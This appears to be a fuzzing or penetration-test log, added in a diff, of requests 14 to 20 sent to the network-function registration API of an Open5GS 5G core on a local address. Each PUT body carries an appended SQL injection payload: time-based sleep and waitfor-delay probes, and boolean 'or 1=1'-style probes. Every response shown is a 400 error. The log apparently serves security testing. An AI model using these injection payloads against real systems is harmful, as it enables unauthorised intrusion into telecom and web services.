+{'sNssais': 'value', 'udmInfoList': 'value', 'bsfInfoList': 'value', 'allowedNfDomains': 'value', 'customInfo': 'value', 'ipv6Addresses': 'value', 'plmnList': 'value', 'udmInfo': 'value', 'pcscfInfoList': 'value', 'nfServiceList': 'value', 'nsiList': 'value', 'udsfInfoList': 'value', 'ausfInfoList': 'value', 'interPlmnFqdn': 'value', 'nfSetIdList': 'value', 'allowedPlmns': 'value', 'allowedNssais': 'value', 'olcHSupportInd': 'value', 'bsfInfo': 'value', 'fqdn': 'value', 'serviceSetRecoveryTimeList': 'value', 'udsfInfo': 'value', 'nwdafInfo': 'value', 'lcHSupportInd': 'value', 'locality': 'value', 'gmlcInfo': 'value', 'priority': 'value', 'loadTimeStamp': 'value', 'chfInfo': 'value', 'snpnList': 'value', 'lmfInfo': 'value', 'smfInfo': 'value', 'servingScope': 'value', 'heartBeatTimer': 'value', 'nfProfileChangesSupportInd': 'value', 'hssInfoList': 'value', 'nrfInfo': 'value', 'scpInfo': 'value', 'allowedNfTypes': 'value', 'pcfInfo': 'value', 'nfInstanceName': 'value', 'capacity': 'value', 'chfInfoList': 'value', 'load': 'value', 'nfServices': 'value', 'nfProfileChangesInd': 'value', 'udrInfo': 'value', 'perPlmnSnssaiList': 'value', 'scpDomains': 'value', 'nefInfo': 'value', 'ausfInfo': 'value', 'nfServicePersistence': 'value', 'ipv4Addresses': 'value', 'recoveryTime': 'value', 'nfInstanceId': 'required_value', 'upfInfo': 'value', 'nfStatus': 'required_value', 'amfInfoList': 'value', 'nfType': 'required_value', 'upfInfoList': 'value', 'allowedSnpns': 'value', 'nfSetRecoveryTimeList': 'value', 'udrInfoList': 'value', 'smfInfoList': 'value', 'defaultNotificationSubscriptions': 'value', 'amfInfo': 'value', 'pcfInfoList': 'value'},(select*from(select(sleep(20)))a)
+
+------------------------------------------------------------
+{'content-length': '114',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:54:03 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"No NFProfile",
+	"status":	400,
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 14
+
+PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+{'sNssais': 'value', 'udmInfoList': 'value', 'bsfInfoList': 'value', 'allowedNfDomains': 'value', 'customInfo': 'value', 'ipv6Addresses': 'value', 'plmnList': 'value', 'udmInfo': 'value', 'pcscfInfoList': 'value', 'nfServiceList': 'value', 'nsiList': 'value', 'udsfInfoList': 'value', 'ausfInfoList': 'value', 'interPlmnFqdn': 'value', 'nfSetIdList': 'value', 'allowedPlmns': 'value', 'allowedNssais': 'value', 'olcHSupportInd': 'value', 'bsfInfo': 'value', 'fqdn': 'value', 'serviceSetRecoveryTimeList': 'value', 'udsfInfo': 'value', 'nwdafInfo': 'value', 'lcHSupportInd': 'value', 'locality': 'value', 'gmlcInfo': 'value', 'priority': 'value', 'loadTimeStamp': 'value', 'chfInfo': 'value', 'snpnList': 'value', 'lmfInfo': 'value', 'smfInfo': 'value', 'servingScope': 'value', 'heartBeatTimer': 'value', 'nfProfileChangesSupportInd': 'value', 'hssInfoList': 'value', 'nrfInfo': 'value', 'scpInfo': 'value', 'allowedNfTypes': 'value', 'pcfInfo': 'value', 'nfInstanceName': 'value', 'capacity': 'value', 'chfInfoList': 'value', 'load': 'value', 'nfServices': 'value', 'nfProfileChangesInd': 'value', 'udrInfo': 'value', 'perPlmnSnssaiList': 'value', 'scpDomains': 'value', 'nefInfo': 'value', 'ausfInfo': 'value', 'nfServicePersistence': 'value', 'ipv4Addresses': 'value', 'recoveryTime': 'value', 'nfInstanceId': 'required_value', 'upfInfo': 'value', 'nfStatus': 'required_value', 'amfInfoList': 'value', 'nfType': 'required_value', 'upfInfoList': 'value', 'allowedSnpns': 'value', 'nfSetRecoveryTimeList': 'value', 'udrInfoList': 'value', 'smfInfoList': 'value', 'defaultNotificationSubscriptions': 'value', 'amfInfo': 'value', 'pcfInfoList': 'value'}' waitfor delay'0:0:20'--
+
+------------------------------------------------------------
+{'content-length': '114',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:54:03 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"No NFProfile",
+	"status":	400,
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 15
+
+PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+{'sNssais': 'value', 'udmInfoList': 'value', 'bsfInfoList': 'value', 'allowedNfDomains': 'value', 'customInfo': 'value', 'ipv6Addresses': 'value', 'plmnList': 'value', 'udmInfo': 'value', 'pcscfInfoList': 'value', 'nfServiceList': 'value', 'nsiList': 'value', 'udsfInfoList': 'value', 'ausfInfoList': 'value', 'interPlmnFqdn': 'value', 'nfSetIdList': 'value', 'allowedPlmns': 'value', 'allowedNssais': 'value', 'olcHSupportInd': 'value', 'bsfInfo': 'value', 'fqdn': 'value', 'serviceSetRecoveryTimeList': 'value', 'udsfInfo': 'value', 'nwdafInfo': 'value', 'lcHSupportInd': 'value', 'locality': 'value', 'gmlcInfo': 'value', 'priority': 'value', 'loadTimeStamp': 'value', 'chfInfo': 'value', 'snpnList': 'value', 'lmfInfo': 'value', 'smfInfo': 'value', 'servingScope': 'value', 'heartBeatTimer': 'value', 'nfProfileChangesSupportInd': 'value', 'hssInfoList': 'value', 'nrfInfo': 'value', 'scpInfo': 'value', 'allowedNfTypes': 'value', 'pcfInfo': 'value', 'nfInstanceName': 'value', 'capacity': 'value', 'chfInfoList': 'value', 'load': 'value', 'nfServices': 'value', 'nfProfileChangesInd': 'value', 'udrInfo': 'value', 'perPlmnSnssaiList': 'value', 'scpDomains': 'value', 'nefInfo': 'value', 'ausfInfo': 'value', 'nfServicePersistence': 'value', 'ipv4Addresses': 'value', 'recoveryTime': 'value', 'nfInstanceId': 'required_value', 'upfInfo': 'value', 'nfStatus': 'required_value', 'amfInfoList': 'value', 'nfType': 'required_value', 'upfInfoList': 'value', 'allowedSnpns': 'value', 'nfSetRecoveryTimeList': 'value', 'udrInfoList': 'value', 'smfInfoList': 'value', 'defaultNotificationSubscriptions': 'value', 'amfInfo': 'value', 'pcfInfoList': 'value'}')waitfor delay'0:0:20'--
+
+------------------------------------------------------------
+{'content-length': '114',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:54:03 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"No NFProfile",
+	"status":	400,
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 16
+
+PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+{'sNssais': 'value', 'udmInfoList': 'value', 'bsfInfoList': 'value', 'allowedNfDomains': 'value', 'customInfo': 'value', 'ipv6Addresses': 'value', 'plmnList': 'value', 'udmInfo': 'value', 'pcscfInfoList': 'value', 'nfServiceList': 'value', 'nsiList': 'value', 'udsfInfoList': 'value', 'ausfInfoList': 'value', 'interPlmnFqdn': 'value', 'nfSetIdList': 'value', 'allowedPlmns': 'value', 'allowedNssais': 'value', 'olcHSupportInd': 'value', 'bsfInfo': 'value', 'fqdn': 'value', 'serviceSetRecoveryTimeList': 'value', 'udsfInfo': 'value', 'nwdafInfo': 'value', 'lcHSupportInd': 'value', 'locality': 'value', 'gmlcInfo': 'value', 'priority': 'value', 'loadTimeStamp': 'value', 'chfInfo': 'value', 'snpnList': 'value', 'lmfInfo': 'value', 'smfInfo': 'value', 'servingScope': 'value', 'heartBeatTimer': 'value', 'nfProfileChangesSupportInd': 'value', 'hssInfoList': 'value', 'nrfInfo': 'value', 'scpInfo': 'value', 'allowedNfTypes': 'value', 'pcfInfo': 'value', 'nfInstanceName': 'value', 'capacity': 'value', 'chfInfoList': 'value', 'load': 'value', 'nfServices': 'value', 'nfProfileChangesInd': 'value', 'udrInfo': 'value', 'perPlmnSnssaiList': 'value', 'scpDomains': 'value', 'nefInfo': 'value', 'ausfInfo': 'value', 'nfServicePersistence': 'value', 'ipv4Addresses': 'value', 'recoveryTime': 'value', 'nfInstanceId': 'required_value', 'upfInfo': 'value', 'nfStatus': 'required_value', 'amfInfoList': 'value', 'nfType': 'required_value', 'upfInfoList': 'value', 'allowedSnpns': 'value', 'nfSetRecoveryTimeList': 'value', 'udrInfoList': 'value', 'smfInfoList': 'value', 'defaultNotificationSubscriptions': 'value', 'amfInfo': 'value', 'pcfInfoList': 'value'}',0)waitfor delay'0:0:20'--
+
+------------------------------------------------------------
+{'content-length': '114',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:54:03 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"No NFProfile",
+	"status":	400,
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 17
+
+PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+{'sNssais': 'value', 'udmInfoList': 'value', 'bsfInfoList': 'value', 'allowedNfDomains': 'value', 'customInfo': 'value', 'ipv6Addresses': 'value', 'plmnList': 'value', 'udmInfo': 'value', 'pcscfInfoList': 'value', 'nfServiceList': 'value', 'nsiList': 'value', 'udsfInfoList': 'value', 'ausfInfoList': 'value', 'interPlmnFqdn': 'value', 'nfSetIdList': 'value', 'allowedPlmns': 'value', 'allowedNssais': 'value', 'olcHSupportInd': 'value', 'bsfInfo': 'value', 'fqdn': 'value', 'serviceSetRecoveryTimeList': 'value', 'udsfInfo': 'value', 'nwdafInfo': 'value', 'lcHSupportInd': 'value', 'locality': 'value', 'gmlcInfo': 'value', 'priority': 'value', 'loadTimeStamp': 'value', 'chfInfo': 'value', 'snpnList': 'value', 'lmfInfo': 'value', 'smfInfo': 'value', 'servingScope': 'value', 'heartBeatTimer': 'value', 'nfProfileChangesSupportInd': 'value', 'hssInfoList': 'value', 'nrfInfo': 'value', 'scpInfo': 'value', 'allowedNfTypes': 'value', 'pcfInfo': 'value', 'nfInstanceName': 'value', 'capacity': 'value', 'chfInfoList': 'value', 'load': 'value', 'nfServices': 'value', 'nfProfileChangesInd': 'value', 'udrInfo': 'value', 'perPlmnSnssaiList': 'value', 'scpDomains': 'value', 'nefInfo': 'value', 'ausfInfo': 'value', 'nfServicePersistence': 'value', 'ipv4Addresses': 'value', 'recoveryTime': 'value', 'nfInstanceId': 'required_value', 'upfInfo': 'value', 'nfStatus': 'required_value', 'amfInfoList': 'value', 'nfType': 'required_value', 'upfInfoList': 'value', 'allowedSnpns': 'value', 'nfSetRecoveryTimeList': 'value', 'udrInfoList': 'value', 'smfInfoList': 'value', 'defaultNotificationSubscriptions': 'value', 'amfInfo': 'value', 'pcfInfoList': 'value'}91337822' or '9780'='9780
+
+------------------------------------------------------------
+{'content-length': '114',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:54:03 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"No NFProfile",
+	"status":	400,
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 18
+
+PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+{'sNssais': 'value', 'udmInfoList': 'value', 'bsfInfoList': 'value', 'allowedNfDomains': 'value', 'customInfo': 'value', 'ipv6Addresses': 'value', 'plmnList': 'value', 'udmInfo': 'value', 'pcscfInfoList': 'value', 'nfServiceList': 'value', 'nsiList': 'value', 'udsfInfoList': 'value', 'ausfInfoList': 'value', 'interPlmnFqdn': 'value', 'nfSetIdList': 'value', 'allowedPlmns': 'value', 'allowedNssais': 'value', 'olcHSupportInd': 'value', 'bsfInfo': 'value', 'fqdn': 'value', 'serviceSetRecoveryTimeList': 'value', 'udsfInfo': 'value', 'nwdafInfo': 'value', 'lcHSupportInd': 'value', 'locality': 'value', 'gmlcInfo': 'value', 'priority': 'value', 'loadTimeStamp': 'value', 'chfInfo': 'value', 'snpnList': 'value', 'lmfInfo': 'value', 'smfInfo': 'value', 'servingScope': 'value', 'heartBeatTimer': 'value', 'nfProfileChangesSupportInd': 'value', 'hssInfoList': 'value', 'nrfInfo': 'value', 'scpInfo': 'value', 'allowedNfTypes': 'value', 'pcfInfo': 'value', 'nfInstanceName': 'value', 'capacity': 'value', 'chfInfoList': 'value', 'load': 'value', 'nfServices': 'value', 'nfProfileChangesInd': 'value', 'udrInfo': 'value', 'perPlmnSnssaiList': 'value', 'scpDomains': 'value', 'nefInfo': 'value', 'ausfInfo': 'value', 'nfServicePersistence': 'value', 'ipv4Addresses': 'value', 'recoveryTime': 'value', 'nfInstanceId': 'required_value', 'upfInfo': 'value', 'nfStatus': 'required_value', 'amfInfoList': 'value', 'nfType': 'required_value', 'upfInfoList': 'value', 'allowedSnpns': 'value', 'nfSetRecoveryTimeList': 'value', 'udrInfoList': 'value', 'smfInfoList': 'value', 'defaultNotificationSubscriptions': 'value', 'amfInfo': 'value', 'pcfInfoList': 'value'}81012731' or '3851'='3854
+
+------------------------------------------------------------
+{'content-length': '114',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:54:03 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"No NFProfile",
+	"status":	400,
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 19
+
+PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+{'sNssais': 'value', 'udmInfoList': 'value', 'bsfInfoList': 'value', 'allowedNfDomains': 'value', 'customInfo': 'value', 'ipv6Addresses': 'value', 'plmnList': 'value', 'udmInfo': 'value', 'pcscfInfoList': 'value', 'nfServiceList': 'value', 'nsiList': 'value', 'udsfInfoList': 'value', 'ausfInfoList': 'value', 'interPlmnFqdn': 'value', 'nfSetIdList': 'value', 'allowedPlmns': 'value', 'allowedNssais': 'value', 'olcHSupportInd': 'value', 'bsfInfo': 'value', 'fqdn': 'value', 'serviceSetRecoveryTimeList': 'value', 'udsfInfo': 'value', 'nwdafInfo': 'value', 'lcHSupportInd': 'value', 'locality': 'value', 'gmlcInfo': 'value', 'priority': 'value', 'loadTimeStamp': 'value', 'chfInfo': 'value', 'snpnList': 'value', 'lmfInfo': 'value', 'smfInfo': 'value', 'servingScope': 'value', 'heartBeatTimer': 'value', 'nfProfileChangesSupportInd': 'value', 'hssInfoList': 'value', 'nrfInfo': 'value', 'scpInfo': 'value', 'allowedNfTypes': 'value', 'pcfInfo': 'value', 'nfInstanceName': 'value', 'capacity': 'value', 'chfInfoList': 'value', 'load': 'value', 'nfServices': 'value', 'nfProfileChangesInd': 'value', 'udrInfo': 'value', 'perPlmnSnssaiList': 'value', 'scpDomains': 'value', 'nefInfo': 'value', 'ausfInfo': 'value', 'nfServicePersistence': 'value', 'ipv4Addresses': 'value', 'recoveryTime': 'value', 'nfInstanceId': 'required_value', 'upfInfo': 'value', 'nfStatus': 'required_value', 'amfInfoList': 'value', 'nfType': 'required_value', 'upfInfoList': 'value', 'allowedSnpns': 'value', 'nfSetRecoveryTimeList': 'value', 'udrInfoList': 'value', 'smfInfoList': 'value', 'defaultNotificationSubscriptions': 'value', 'amfInfo': 'value', 'pcfInfoList': 'value'}66939417' or 2512=2512--
+
+------------------------------------------------------------
+{'content-length': '114',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:54:03 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"No NFProfile",
+	"status":	400,
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 20
+
+PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+{'sNssais': 'value', 'udmInfoList': 'value', 'bsfInfoList': 'value', 'allowedNfDomains': 'value', 'customInfo': 'value', 'ipv6Addresses': 'value', 'plmnList': 'value', 'udmInfo': 'value', 'pcscfInfoList': 'value', 'nfServiceList': 'value', 'nsiList': 'value', 'udsfInfoList': 'value', 'ausfInfoList': 'value', 'interPlmnFqdn': 'value', 'nfSetIdList': 'value', 'allowedPlmns': 'value', 'allowedNssais': 'value', 'olcHSupportInd': 'value', 'bsfInfo': 'value', 'fqdn': 'value', 'serviceSetRecoveryTimeList': 'value', 'udsfInfo': 'value', 'nwdafInfo': 'value', 'lcHSupportInd': 'value', 'locality': 'value', 'gmlcInfo': 'value', 'priority': 'value', 'loadTimeStamp': 'value', 'chfInfo': 'value', 'snpnList': 'value', 'lmfInfo': 'value', 'smfInfo': 'value', 'servingScope': 'value', 'heartBeatTimer': 'value', 'nfProfileChangesSupportInd': 'value', 'hssInfoList': 'value', 'nrfInfo': 'value', 'scpInfo': 'value', 'allowedNfTypes': 'value', 'pcfInfo': 'value', 'nfInstanceName': 'value', 'capacity': 'value', 'chfInfoList': 'value', 'load': 'value', 'nfServices': 'value', 'nfProfileChangesInd': 'value', 'udrInfo': 'value', 'perPlmnSnssaiList': 'value', 'scpDomains': 'value', 'nefInfo': 'value', 'ausfInfo': 'value', 'nfServicePersistence': 'value', 'ipv4Addresses': 'value', 'recoveryTime': 'value', 'nfInstanceId': 'required_value', 'upfInfo': 'value', 'nfStatus': 'required_value', 'amfInfoList': 'value', 'nfType': 'required_value', 'upfInfoList': 'value', 'allowedSnpns': 'value', 'nfSetRecoveryTimeList': 'value', 'udrInfoList': 'value', 'smfInfoList': 'value', 'defaultNotificationSubscriptions': 'value', 'amfInfo': 'value', 'pcfInfoList': 'value'}72894811' or 4315=4324--
+
+------------------------------------------------------------
+{'content-length': '114',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:54:03 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"No NFProfile",
+	"status":	400,
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
